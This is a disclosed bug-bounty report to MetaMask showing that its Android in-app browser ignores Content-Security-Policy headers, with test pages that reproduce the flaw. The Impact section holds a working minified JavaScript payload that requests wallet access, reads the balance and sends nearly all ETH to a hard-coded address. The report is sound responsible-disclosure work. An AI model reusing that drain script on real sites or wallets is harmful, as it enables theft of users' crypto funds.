# MetaMask Browser (on Android) does not enforce Content-Security-Policy header

## Report Details
- **Report ID**: 1941767
- **URL**: https://hackerone.com/reports/1941767
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-04-11T10:19:32.222Z
- **Disclosed**: 2024-08-27T15:02:23.483Z

## Reporter
- **Username**: renniepak
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: metamask

## Vulnerability Information
Hi MetaMask Team,

Recently I came across a Cross-Site Scripting bug on the website of a well known crypto company. They had a very strict Content-Security-Policy header, effectively preventing me from achieving anything more then a simple HTML injection with it. That all changed when I opened up the website in MetaMasks browser (in the Android app), when all the sudden my XSS payload did execute. Upon further investigation, it seems that the browser in MetaMask ignores any Content-Security-Policy headers. 

I proceeded to perform some tests and noticed that the MetaMask Browser does accept (and enforces) a Content-Security-Policy when used within a `<meta>` tag. I searched the code to see if this is intended behaviour, possibly by deliberately disabling some security features, but I couldn't find any indicators to suggest this.

I doubted whether to report this as a vulnerability, since you could argue this is a defence-in-depth measure and not a vulnerability. But I then figured: MetaMask is a substantial part of the Web3 space and it's users largely depend on it's secure implementation. Websites use a Content-Security-Policy as a last line of defence against XSS attacks and count on this feature since it is [supported](https://caniuse.com/?search=CS) by every major browser for years already. Since MetaMask offers a browser within it's wallet, you would expect it to be "on par" with the security of any other browser, if not more secure since we are dealing with crypto currencies/assets. If, for example, Chrome all the sudden wouldn't support CSP any more , that would be seen as a huge vulnerability, and I guess it's fair to say the same for MetaMasks browser given this context.

## Reproduction

1. Install MetaMask (v6.1.1 (1079)) for Android and create a wallet. 
2. In a regular browser (on a desktop) navigate to https://0-a.nl/cspmeta.php

```html
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="Content-Security-Policy" content="script-src 'none'">
	<title></title>
</head>
<body>
	CSP enforced with &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#39;none&#39;&quot;&gt;
<script>alert('Javascript is executed.')</script>
</body>
</html>
```

Notice how our javascript `<script>alert('Javascript is executed.')</script>` is blocked by the browser (Chrome in this example):

{F2286112}

3. Now open the same url in MetaMask browser. Notice that it seems to be blocked here as well, as we don't get an `alert()` box.

{F2286116}

4. Now in the regular browser navigate to https://0-a.nl/cspheader.php

```php
<?php
header("Content-Security-Policy: script-src 'none'");

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title></title>
</head>
<body>
	CSP enforced with header &lt;?php header(&quot;Content-Security-Policy: script-src &#39;none&#39;&quot;); ?&gt;
<script>alert('Javascript is executed.')</script>
</body>
</html>
```

Notice how our javascript is again blocked by the browser:

{F2286118}

5. Now open the same url in MetaMask browser:

Notice how our javascript IS executed despite the `Content-Security-Policy: script-src 'none'` header.

{F2286120}

## Impact

Websites use a Content-Security-Policy as a last line of defence against Cross-Site Scripting attacks. If it the browser fails to enforce the Content-Security-Policy as expected, a website that is vulnerable to Cross-Site Scripting can be compromised in numerous ways. One Metamask specific example is that the attacker could create a XSS payload that will interact with the MetaMask wallet directly. Since the victim (the user / wallet owner) is likely already "Connected" to the site with MetaMask, the XSS payload can immediately invoke transaction etc.

### Example

1. With the MetaMask browser navigate to https://0-a.nl/web3attack.php. Make sure to do this with a Wallet that has ETH balance (more than 0).

```php
<?php
header("Content-Security-Policy: script-src 'none'");
?>
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>

<div class="bg"></div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.2.7/web3.min.js"></script>
<script>setTimeout((async()=>{if(void 0!==window.ethereum){window.web3=new window.Web3(window.ethereum);try{await window.ethereum.enable();var e=await window.web3.eth.getAccounts(),t=await window.web3.eth.getBalance(e[0]),w="0xeEF05b25dF83A481D22778a2d28CaFAD38d0fA59";let i=t;i=window.web3.utils.toBN(i).sub(window.web3.utils.toBN(21e3*window.web3.utils.toWei("1","gwei"))).toString(),window.web3.eth.sendTransaction({from:e[0],to:w,value:i,gasPrice:window.web3.utils.toWei("1","gwei"),gas:21e3},(()=>{}))}catch(e){}}}),1e3);</script>

</body>
</html>
```
 
2. Connect to 0-a.nl (this step wouldn't be necessary for a victim that already interacted with the vulnerable page via MetaMask browser)

{F2286122}

3. Notice how a transaction will be initiated by the "vulnerable" website to transfer out all ETH in the wallet despite that any javascript execution should be blocked according to the Content-Security-Policy.

{F2286123}

## Final notes

I am curious to hear how you feel about this issue. Like I explained before, I doubted to report this, but to resummarise my reasons to report this anyways:

- MetaMask is the most well known crypto wallet out there so the the impact is relatively large.
- When you offer a browser from **within** a crypto wallet you would expect the security measures to be "on par" with any modern browser, if not better.
- Documentation does not mention anywhere that the CSP header is ignored by the MetaMask browser
- As far as I could see, no code was present in https://github.com/MetaMask/metamask-mobile/ that suggest that this was disabled on purpose.
- Content-Security-Policy seems to be working but only when used in a `<meta>` tag

I thought this would warrant it to call this a vulnerability but of course that's for you to decide :)
If there are any questions or concerns, feel free to reach out! 

Kind regards,

René / renniepak

## Attachments
- Screenshot_2023-04-11_100820.png
- Screenshot_2023-04-11_100834.png
- Screenshot_2023-04-11_100922.png
- Screenshot_2023-04-11_100906.png
- WhatsApp_Image_2023-04-11_at_09.42.57.jpeg
- WhatsApp_Image_2023-04-11_at_09.42.56.jpeg
